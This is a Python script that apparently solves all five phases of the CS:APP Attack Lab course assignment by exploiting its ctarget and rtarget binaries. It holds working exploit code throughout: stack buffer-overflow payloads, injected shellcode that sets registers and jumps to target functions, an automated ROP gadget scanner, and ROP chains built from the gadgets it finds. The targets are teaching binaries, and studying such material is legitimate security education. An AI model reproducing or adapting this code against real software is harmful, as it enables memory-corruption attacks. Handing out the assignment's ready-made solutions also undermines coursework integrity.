import os
import subprocess
import re
import struct
import sys

# --- 配置 ---
COOKIE_FILE = "cookie.txt"
CTARGET = "./ctarget"
RTARGET = "./rtarget"
HEX2RAW = "./hex2raw"

def log(msg, color="white"):
    colors = {
        "green": "\033[92m",
        "red": "\033[91m",
        "yellow": "\033[93m",
        "blue": "\033[94m",
        "reset": "\033[0m"
    }
    c = colors.get(color, colors["reset"])
    print(f"{c}[*] {msg}{colors['reset']}")

def p64(addr):
    return struct.pack('<Q', addr)

def get_cookie():
    """读取 Cookie 并自动去除 0x 前缀"""
    try:
        with open(COOKIE_FILE, 'r') as f:
            c = f.read().strip()
            # 修复：去除 0x 前缀，防止 hexmatch 失败
            if c.lower().startswith("0x"):
                clean_c = c[2:]
            else:
                clean_c = c
            
            log(f"Cookie found: {clean_c} (Original: {c})", "green")
            return int(clean_c, 16), clean_c
    except FileNotFoundError:
        log("Error: cookie.txt not found!", "red")
        sys.exit(1)

def run_command(cmd):
    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return result.decode('latin-1')
    except subprocess.CalledProcessError:
        return ""

def get_symbol_addr(binary, symbol):
    out = run_command(f"objdump -t {binary} | grep ' {symbol}$'")
    match = re.search(r'([0-9a-fA-F]+)', out)
    if match:
        return int(match.group(1), 16)
    return None

def get_buffer_size(binary):
    out = run_command(f"objdump -d {binary} | grep '<getbuf>:' -A 5")
    match = re.search(r'sub\s+\$0x([0-9a-fA-F]+),%rsp', out)
    if match:
        return int(match.group(1), 16)
    return 40

def get_stack_addr(binary):
    log(f"Running GDB on {binary} to find stack address...", "blue")
    cmd = [
        "gdb", "-batch",
        "-ex", f"file {binary}",
        "-ex", "break getbuf",
        "-ex", "run -q",
        "-ex", "print /x $rsp",
        "-ex", "quit"
    ]
    try:
        out = subprocess.check_output(cmd, stderr=subprocess.STDOUT).decode()
        match = re.search(r'\$1 = (0x[0-9a-fA-F]+)', out)
        if match:
            rsp = int(match.group(1), 16)
            log(f"GDB RSP found: {hex(rsp)}", "green")
            return rsp
        return None
    except Exception as e:
        log(f"GDB Execution failed: {e}", "red")
        return None

# ==========================================
# 核心升级：智能 Gadget 搜索
# ==========================================

class ByteMap:
    def __init__(self, binary):
        self.bytes = [] # [(addr, byte_val), ...]
        self.lines = {} # {addr: "asm line string"}
        self._parse(binary)

    def _parse(self, binary):
        log(f"Parsing {binary} for gadgets...", "blue")
        dump = run_command(f"objdump -d {binary}")
        current_func = ""
        
        # 正则匹配形如: 401dba:	b8 58 c3 6f b9 	mov ...
        line_re = re.compile(r'^\s*([0-9a-f]+):\s+([0-9a-f ]+)\s+(.*)$')
        
        for line in dump.splitlines():
            if "<" in line and ">:" in line:
                current_func = line.strip()
            
            match = line_re.match(line)
            if match:
                addr_str = match.group(1)
                bytes_str = match.group(2)
                asm_str = match.group(3)
                
                addr = int(addr_str, 16)
                byte_vals = [int(b, 16) for b in bytes_str.strip().split()]
                
                # 记录这行汇编，用于打印调试
                self.lines[addr] = f"{addr_str}: {bytes_str.ljust(22)} {asm_str}"
                
                for i, b in enumerate(byte_vals):
                    self.bytes.append((addr + i, b))

    def find_best_gadget(self, target_hex_str):
        """
        寻找 target_hex_str，且要求后面紧跟 c3 (ret)。
        优先返回 距离 ret 最近的 (最纯净的)。
        """
        # 将 "48 89 e0" 转为 [0x48, 0x89, 0xe0]
        target = [int(x, 16) for x in target_hex_str.split()]
        candidates = []

        # 线性扫描
        for i in range(len(self.bytes) - len(target)):
            # 1. 检查目标字节序列是否匹配
            match = True
            for k in range(len(target)):
                if self.bytes[i+k][1] != target[k]:
                    match = False
                    break
            
            if match:
                start_addr = self.bytes[i][0]
                # 2. 向后查找 c3 (ret)，限制只找 4 个字节，太远了就不算 Gadget 了
                dist_to_ret = -1
                for offset in range(len(target), len(target) + 4):
                    if i + offset < len(self.bytes):
                        if self.bytes[i + offset][1] == 0xc3:
                            dist_to_ret = offset - len(target)
                            break
                
                if dist_to_ret != -1:
                    # 找到一个有效 Gadget
                    # 尝试找到它所属的原始汇编行，用于展示
                    line_asm = "???"
                    # 简单的向回找行首的算法
                    temp_addr = start_addr
                    while temp_addr > start_addr - 10:
                        if temp_addr in self.lines:
                            line_asm = self.lines[temp_addr]
                            break
                        temp_addr -= 1
                    
                    candidates.append({
                        'addr': start_addr,
                        'dist': dist_to_ret, # 0表示紧挨着，越小越好
                        'asm': line_asm
                    })

        if not candidates:
            log(f"Can not found Gadget'{target_hex_str}'")
            return None
        
        # 3. 排序：优先选距离 ret 最近的 (dist 最小)，防止中间夹杂 destructive 指令
        candidates.sort(key=lambda x: x['dist'])
        
        best = candidates[0]
        log(f"Gadget '{target_hex_str}' found at {hex(best['addr'])} (Padding: {best['dist']})", "green")
        log(f"   In line: {best['asm']}", "green")
        
        # 如果有多个候选，也打印一下，方便调试
        if(len(candidates) > 1):
             log(f"   (Ignored {len(candidates)-1} other candidates with more padding/garbage)", "yellow")

        return best['addr']

# ==========================================
# 主逻辑
# ==========================================

def solve():
    cookie_int, cookie_str = get_cookie()
    
    # --- Phase 1 ---
    log("--- Phase 1 ---", "blue")
    touch1_addr = get_symbol_addr(CTARGET, "touch1")
    buf_size = get_buffer_size(CTARGET)
    if touch1_addr:
        p1 = b'\x00' * buf_size + p64(touch1_addr)
        with open("1.txt", 'w') as f: f.write(" ".join([f"{b:02x}" for b in p1]))
        test_phase(1, CTARGET)
    
    # --- Phase 2 & 3 ---
    rsp_val = get_stack_addr(CTARGET)
    if rsp_val:
        buf_start = rsp_val - buf_size
        
        # Phase 2
        log("\n--- Phase 2 ---", "blue")
        touch2_addr = get_symbol_addr(CTARGET, "touch2")
        code2 = b'\x48\xc7\xc7' + struct.pack('<I', cookie_int) + b'\x68' + struct.pack('<I', touch2_addr) + b'\xc3'
        p2 = code2 + b'\x00' * (buf_size - len(code2)) + p64(buf_start)
        with open("2.txt", 'w') as f: f.write(" ".join([f"{b:02x}" for b in p2]))
        test_phase(2, CTARGET)

        # Phase 3
        log("\n--- Phase 3 ---", "blue")
        touch3_addr = get_symbol_addr(CTARGET, "touch3")
        str_addr = buf_start + buf_size + 8
        code3 = b'\x48\xbf' + p64(str_addr) + b'\x68' + struct.pack('<I', touch3_addr) + b'\xc3'
        p3 = code3 + b'\x00' * (buf_size - len(code3)) + p64(buf_start) + cookie_str.encode() + b'\x00'
        with open("3.txt", 'w') as f: f.write(" ".join([f"{b:02x}" for b in p3]))
        test_phase(3, CTARGET)

    # --- Phase 4 & 5 (RTARGET) ---
    # 初始化字节映射
    rtarget_map = ByteMap(RTARGET)

    log("\n--- Phase 4 ---", "blue")
    touch2_r = get_symbol_addr(RTARGET, "touch2")
    # 搜索: pop rax; ret
    g_pop_rax = rtarget_map.find_best_gadget("58") 
    # 搜索: mov rax, rdi; ret
    g_mov_rax_rdi = rtarget_map.find_best_gadget("48 89 c7")
    
    if g_pop_rax and g_mov_rax_rdi:
        p4 = b'\x00' * buf_size + p64(g_pop_rax) + p64(cookie_int) + p64(g_mov_rax_rdi) + p64(touch2_r)
        with open("4.txt", 'w') as f: f.write(" ".join([f"{b:02x}" for b in p4]))
        test_phase(4, RTARGET)

    log("\n--- Phase 5 ---", "blue")
    touch3_r = get_symbol_addr(RTARGET, "touch3")
    
    # 搜索 Phase 5 专用 Gadgets
    # 这里通过 find_best_gadget 的排序逻辑，会自动避开那个带 92(xchg) 的坏 Gadget
    g_rsp_rax = rtarget_map.find_best_gadget("48 89 e0") # mov %rsp, %rax
    g_eax_ecx = rtarget_map.find_best_gadget("89 c1")    # mov %eax, %ecx
    g_ecx_edx = rtarget_map.find_best_gadget("89 ca")    # mov %ecx, %edx
    g_edx_esi = rtarget_map.find_best_gadget("89 d6")    # mov %edx, %esi
    g_lea     = rtarget_map.find_best_gadget("48 8d 04 37") # lea (%rdi,%rsi,1),%rax

    # 再次检查 gadgets 是否齐全 (g_pop_rax 和 g_mov_rax_rdi 复用 Phase 4 的)
    req_gadgets = [g_rsp_rax, g_mov_rax_rdi, g_pop_rax, g_eax_ecx, g_ecx_edx, g_edx_esi, g_lea]
    
    if all(req_gadgets):
        # 偏移量 0x48 是基于标准栈布局算出来的 (72 bytes)
        offset_val = 0x48 
        
        p5 = b'\x00' * buf_size
        p5 += p64(g_rsp_rax)
        p5 += p64(g_mov_rax_rdi)
        p5 += p64(g_pop_rax)
        p5 += p64(offset_val)
        p5 += p64(g_eax_ecx)
        p5 += p64(g_ecx_edx)
        p5 += p64(g_edx_esi)
        p5 += p64(g_lea)
        p5 += p64(g_mov_rax_rdi)
        p5 += p64(touch3_r)
        p5 += cookie_str.encode() + b'\x00'
        
        with open("5.txt", 'w') as f: f.write(" ".join([f"{b:02x}" for b in p5]))
        test_phase(5, RTARGET)
    else:
        log("Phase 5 skipped due to missing gadgets.", "red")

def test_phase(num, binary):
    raw = f"raw{num}.txt"
    cmd = f"{HEX2RAW} < {num}.txt > {raw} && {binary} -q -i {raw}"
    try:
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
        if "PASS" in out or f"touch{num}" in out:
            log(f"Phase {num} SUCCESS!", "green")
        else:
            print(out)
            log(f"Phase {num} FAILED", "red")
    except:
        log(f"Phase {num} CRASHED", "red")

if __name__ == "__main__":
    solve()